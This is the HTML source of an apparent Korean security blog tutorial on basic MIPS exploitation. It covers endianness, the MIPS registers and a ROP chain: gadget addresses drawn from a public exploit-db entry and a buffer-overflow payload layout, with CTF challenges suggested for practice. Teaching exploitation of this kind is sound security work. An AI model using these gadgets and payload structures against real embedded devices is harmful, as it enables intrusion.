&lt;p&gt;&amp;#xC2E4;&amp;#xC81C;&amp;#xB85C; shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xB294; libc base leak&amp;#xACFC; &lt;code&gt;sleep()&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xB530;&amp;#xB978; &amp;#xAC00;&amp;#xC82F; &amp;#xD638;&amp;#xCD9C;&amp;#xB3C4; &amp;#xD544;&amp;#xC694;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, ROP &amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/48994&#34;&gt;https://www.exploit-db.com/exploits/48994&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;First ROP (sleep_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x0004c974&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab2e974&lt;/span&gt;
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c97c&lt;/span&gt;      move    t9, s0
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c980&lt;/span&gt;      lw      ra, (var_1ch)
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c984&lt;/span&gt;      lw      s0, (var_18h)
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c988&lt;/span&gt;      addiu   a0, zero, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; ; arg1
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c98c&lt;/span&gt;      addiu   a1, zero, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; ; arg2
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c990&lt;/span&gt;      move    a2, zero
&lt;span class=&#34;hljs-number&#34;&gt;0x0004c994&lt;/span&gt;      jr      t9

Second ROP (stack_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x00039fa8&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab1bfa8&lt;/span&gt;
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fa8&lt;/span&gt;      addiu   s0, sp, &lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fac&lt;/span&gt;      move    a0, s3
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb0&lt;/span&gt;      move    a1, s0
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb4&lt;/span&gt;      move    t9, s1
&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb8&lt;/span&gt;      jalr    t9

Third ROP (call_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x000406d8&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab226d8&lt;/span&gt;
&lt;span class=&#34;hljs-number&#34;&gt;0x000406d8&lt;/span&gt;      move    t9, s0
&lt;span class=&#34;hljs-number&#34;&gt;0x000406dc&lt;/span&gt;      jalr    t9

payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;160&lt;/span&gt; + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xB9C1;&amp;#xD06C;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; ROP &amp;#xAC00;&amp;#xC82F;&amp;#xACFC; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xCCAB;&amp;#xBC88;&amp;#xC9F8; &amp;#xAC00;&amp;#xC82F;&amp;#xC740; &lt;code&gt;sleep()&lt;/code&gt; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC744; &amp;#xC704;&amp;#xD574; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC778;&amp;#xC790; &amp;#xC138;&amp;#xD305;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &amp;#xAC12;&amp;#xC744; &lt;code&gt;0&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD560; &amp;#xB54C;, &lt;code&gt;0&lt;/code&gt;&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &lt;code&gt;zero&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAC83; &amp;#xC5ED;&amp;#xC2DC; MIPS&amp;#xC758; &amp;#xD2B9;&amp;#xC9D5;&amp;#xC774;&amp;#xB77C;&amp;#xACE0; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xB450;&amp;#xBC88;&amp;#xC9F8; &amp;#xAC00;&amp;#xC82F;&amp;#xC740; &amp;#xC2A4;&amp;#xD0DD; &amp;#xC815;&amp;#xB9AC; &amp;#xAC00;&amp;#xC82F;&amp;#xC73C;&amp;#xB85C;, &amp;#xC55E;&amp;#xC120; &amp;#xC2E4;&amp;#xC2B5;&amp;#xC5D0;&amp;#xC11C; &amp;#xC18C;&amp;#xAC1C;&amp;#xD55C; &lt;code&gt;__libc_csu_init&lt;/code&gt;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC5D0;&amp;#xC11C; &amp;#xC5B4;&amp;#xB835;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xCC3E;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C; &amp;#xAC00;&amp;#xC82F;&amp;#xACFC; &amp;#xB354;&amp;#xBD88;&amp;#xC5B4; ROP &amp;#xCCB4;&amp;#xC778;&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB05D;&amp;#xC73C;&amp;#xB85C; MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2E4;&amp;#xC2B5;&amp;#xD558;&amp;#xAE30;&amp;#xAC00; &amp;#xC870;&amp;#xAE08; &amp;#xC5B4;&amp;#xB835;&amp;#xACE0;, CTF &amp;#xBB38;&amp;#xC81C;&amp;#xB85C; &amp;#xACF5;&amp;#xBD80;&amp;#xD574;&amp;#xBCF4;&amp;#xACE0; &amp;#xC2F6;&amp;#xC73C;&amp;#xC2E0; &amp;#xBD84;&amp;#xB4E4;&amp;#xC740; &amp;#xC544;&amp;#xB798; &amp;#xBB38;&amp;#xC81C;&amp;#xB4E4;&amp;#xC744; &amp;#xCC38;&amp;#xACE0;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB420; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Hack.lu 2019 - no_risc_no_future&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HackCTF - BabyMIPS&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;MIPS&amp;#xC640; &amp;#xAC19;&amp;#xC740; RISC &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xB294; &amp;#xCC98;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xB0AF;&amp;#xC124;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98; &amp;#xD2B9;&amp;#xC131;&amp;#xC5D0; &amp;#xB530;&amp;#xB978; &amp;#xC775;&amp;#xC2A4; &amp;#xAFC0;&amp;#xD301;(?)&amp;#xC5D0; &amp;#xC775;&amp;#xC219;&amp;#xD574;&amp;#xC9C0;&amp;#xBA74; &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xD560;&amp;#xB9CC; &amp;#xD55C; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xCC98;&amp;#xC74C; MIPS&amp;#xC5D0;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xD558;&amp;#xC2DC;&amp;#xB294; &amp;#xBD84;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xC870;&amp;#xAE08;&amp;#xC774;&amp;#xB098;&amp;#xB9C8; &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; &amp;#xB418;&amp;#xC5C8;&amp;#xC73C;&amp;#xBA74; &amp;#xC88B;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xB2E4;&amp;#xB978; &amp;#xC784;&amp;#xBCA0;&amp;#xB514;&amp;#xB4DC; &amp;#xC8FC;&amp;#xC81C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC624;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xAC10;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! &amp;#x1F44B;&amp;#x1F3FB;&lt;/p&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] Exploitation basic in MIPS (KO) - hackyboiz">
  <meta property="og:description" content="&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &lt;code&gt;newp1ayer48&lt;/code&gt; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image1.jpg&#34; alt=&#34;image1.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC784;&amp;#xBCA0;&amp;#xB514;&amp;#xB4DC; &amp;#xD574;&amp;#xD0B9;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB2E4; &amp;#xBCF4;&amp;#xBA74;, &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; RISC &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xC758; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC640; &amp;#xD658;&amp;#xACBD;&amp;#xC744; &amp;#xB9CC;&amp;#xB098;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB300;&amp;#xBD80;&amp;#xBD84; ARM &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xB97C; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xACE0; &amp;#xC811;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xAC00; &amp;#xB9CE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7EC;&amp;#xB098; MIPS, MIPSEL &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98; &amp;#xC5ED;&amp;#xC2DC; &amp;#xC5B4;&amp;#xB835;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xB9C8;&amp;#xC8FC;&amp;#xCE60; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xC5B4;&amp;#xC148; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xC640; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xAC00; &amp;#xC0DD;&amp;#xAE34; &amp;#xAC83;&amp;#xBD80;&amp;#xD130; &amp;#xB0AF;&amp;#xC124;&amp;#xACE0;, &amp;#xAC8C;&amp;#xB2E4;&amp;#xAC00; Cache &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xACE0;&amp;#xB824;&amp;#xD560; &amp;#xAC83;&amp;#xAE4C;&amp;#xC9C0;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC18C; &amp;#xC774;&amp;#xC9C8;&amp;#xC801;&amp;#xC778; &amp;#xC774; MIPS&amp;#xC5D0;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAC00;&amp;#xC7A5; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xB2E4;&amp;#xB904;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h2 id=&#34;1-MIPS-vs-MIPSEL&#34;&gt;&lt;a href=&#34;#1-MIPS-vs-MIPSEL&#34; class=&#34;headerlink&#34; title=&#34;1. MIPS vs MIPSEL&#34;&gt;&lt;/a&gt;1. MIPS vs MIPSEL&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image2.jpg&#34; alt=&#34;image2.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xB294; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC640; &amp;#xBA85;&amp;#xB839;&amp;#xC774; &amp;#xD558;&amp;#xB098;&amp;#xC758; &amp;#xC5ED;&amp;#xD560;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xC124;&amp;#xACC4;&amp;#xB41C; RISC &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98; &amp;#xC911;&amp;#xC5D0; &amp;#xD558;&amp;#xB098; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xAC00; &amp;#xB9CE;&amp;#xC544;&amp;#xC9C4;&amp;#xB2E4;&amp;#xB294; &amp;#xB2E8;&amp;#xC810;&amp;#xC774; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xAC00; &amp;#xB2E8;&amp;#xC21C;&amp;#xD558;&amp;#xACE0; &amp;#xADF8;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &amp;#xC804;&amp;#xB825; &amp;#xC18C;&amp;#xBAA8;&amp;#xAC00; &amp;#xC801;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC784;&amp;#xBCA0;&amp;#xB514;&amp;#xB4DC; &amp;#xAE30;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C; &amp;#xC8FC;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xB294; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4; &amp;#xC138;&amp;#xD2B8;&amp;#xAC00; &amp;#xAE54;&amp;#xB054;&amp;#xD558;&amp;#xAC8C; &amp;#xC815;&amp;#xB9AC;&amp;#xB418;&amp;#xC5C8;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, &amp;#xB300;&amp;#xD559; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130; &amp;#xAD6C;&amp;#xC870; &amp;#xB54C; &amp;#xAC00;&amp;#xB974;&amp;#xCE58;&amp;#xB294; &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xAC00; MIPS&amp;#xC778; &amp;#xACBD;&amp;#xC6B0;&amp;#xAC00; &amp;#xB9CE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;(&amp;#xC800;&amp;#xB3C4; &amp;#xADF8;&amp;#xB7AC;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;)&amp;#x2026;&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xB294; &amp;#xBE45;&amp;#xC5D4;&amp;#xB514;&amp;#xC548;, MIPSEL&amp;#xC740; &amp;#xB9AC;&amp;#xD2C0;&amp;#xC5D4;&amp;#xB514;&amp;#xC548;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. MIPSEL&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xC800;&amp;#xC7A5; &amp;#xBC29;&amp;#xC2DD;&amp;#xB9CC; &amp;#xB9AC;&amp;#xD2C0;&amp;#xC5D4;&amp;#xB514;&amp;#xC548;&amp;#xC73C;&amp;#xB85C; &amp;#xCC44;&amp;#xD0DD;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, MIPS&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xB3D9;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAE30;&amp;#xC874;&amp;#xC5D0; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; x86-64 &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xC800;&amp;#xC7A5; &amp;#xBC29;&amp;#xC2DD;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, MIPSEL&amp;#xB3C4; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xAC8C; pwntools &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C;, MIPSEL &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; pwntools&amp;#xC758; &lt;code&gt;p32()&lt;/code&gt;, &lt;code&gt;p64()&lt;/code&gt;&amp;#xB97C; &amp;#xADF8;&amp;#xB300;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h2 id=&#34;2-MIPS-Stack-amp-Register&#34;&gt;&lt;a href=&#34;#2-MIPS-Stack-amp-Register&#34; class=&#34;headerlink&#34; title=&#34;2. MIPS Stack &amp;amp; Register&#34;&gt;&lt;/a&gt;2. MIPS Stack &amp;amp; Register&lt;/h2&gt;&lt;p&gt;&amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0; &amp;#xC55E;&amp;#xC11C; MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xAD6C;&amp;#xC131;&amp;#xACFC; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xC774;&amp;#xD574;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;MIPS &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xC758; &amp;#xACF5;&amp;#xC2DD; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4;&amp;#xB294; &lt;a href=&#34;https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf&#34;&gt;MIPS32 Architecture For Programmers Volume I&lt;/a&gt;&amp;#xACFC; &lt;a href=&#34;https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf&#34;&gt;MIPS Assembly Language Programmer&amp;#x2019;s Guide&lt;/a&gt; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC911; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xAD00;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; &amp;#xC6B0;&amp;#xB9AC;&amp;#xC5D0;&amp;#xAC8C; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC9C0;&amp;#xC2DD;&amp;#xC744; &amp;#xB2E4;&amp;#xB904;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xC120;, MIPS&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &amp;#xBAA9;&amp;#xB85D;&amp;#xACFC; &amp;#xC5ED;&amp;#xD560;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&amp;#xC774;&amp;#xB984;&lt;/th&gt;
&lt;th&gt;&amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &amp;#xBC88;&amp;#xD638;&lt;/th&gt;
&lt;th&gt;&amp;#xC5ED;&amp;#xD560;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$zero&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$0&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0&amp;#xC744; &amp;#xCD9C;&amp;#xB825;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$at&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC758;&amp;#xC0AC; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4; &amp;#xACC4;&amp;#xC0B0; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xC704;&amp;#xD574; &amp;#xC608;&amp;#xC57D;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$v0&lt;/code&gt; ~ &lt;code&gt;$v1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$2&lt;/code&gt; ~ &lt;code&gt;$3&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xBC18;&amp;#xD658; &amp;#xB41C; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$a0&lt;/code&gt; ~ &lt;code&gt;$a3&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$4&lt;/code&gt; ~ &lt;code&gt;$7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xD568;&amp;#xC218; &amp;#xC778;&amp;#xC218; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$t0&lt;/code&gt; ~ &lt;code&gt;$t7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$8&lt;/code&gt; ~ &lt;code&gt;$15&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC5B4;&amp;#xC148;&amp;#xBE14;&amp;#xB7EC;&amp;#xB098; &amp;#xC5B8;&amp;#xC5B4;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC12;&amp;#xC744; &amp;#xC784;&amp;#xC2DC; &amp;#xC800;&amp;#xC7A5; &amp;#xC2DC; &amp;#xC0AC;&amp;#xC6A9;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$s0&lt;/code&gt; ~ &lt;code&gt;$s7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$16&lt;/code&gt; ~ &lt;code&gt;$23&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC624;&amp;#xB7AB;&amp;#xB3D9;&amp;#xC548; &amp;#xC9C0;&amp;#xC18D;&amp;#xB418;&amp;#xB294; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD560; &amp;#xB54C; &amp;#xC0AC;&amp;#xC6A9;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$t8&lt;/code&gt; ~ &lt;code&gt;$t9&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$24&lt;/code&gt; ~ &lt;code&gt;$25&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&amp;#xC5B4;&amp;#xC148;&amp;#xBE14;&amp;#xB7EC;&amp;#xB098; &amp;#xC5B8;&amp;#xC5B4;&amp;#xC5D0;&amp;#xC11C; &amp;#xAC12;&amp;#xC744; &amp;#xC784;&amp;#xC2DC;&amp;#xB85C; &amp;#xC800;&amp;#xC7A5;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$k0&lt;/code&gt; ~ &lt;code&gt;$k1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;&lt;code&gt;$26&lt;/code&gt; ~ &lt;code&gt;$27&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;OS &amp;#xCEE4;&amp;#xB110;&amp;#xC744; &amp;#xC704;&amp;#xD574; &amp;#xC608;&amp;#xC57D;&lt;/td&gt;
